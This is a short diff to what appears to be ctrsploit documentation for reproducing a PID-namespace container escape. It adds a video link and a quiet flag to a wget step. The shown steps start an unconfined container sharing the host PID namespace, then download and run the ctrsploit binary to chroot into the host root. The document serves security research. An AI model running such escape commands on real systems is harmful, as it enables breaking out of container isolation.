@@ -21,6 +21,8 @@ ctrsploit vul ns pid checksec
 
 ## 5. Reproduce
 
+![](./video.svg)
+
 ### 5.1 Reproduce Environment
 
 ```shell
@@ -50,7 +52,7 @@ libseccomp: 2.5.5
 
 ```shell
 root@localhost:~# docker run -ti --pid=host --security-opt apparmor=unconfined busybox
-/ # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
+/ # wget -q https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
 / # chmod +x /usr/bin/ctrsploit
 / # ctrsploit vul ns pid x proc
 INFO[0000] trying to chroot to /proc/self/fd/3 (/proc/268/root) 
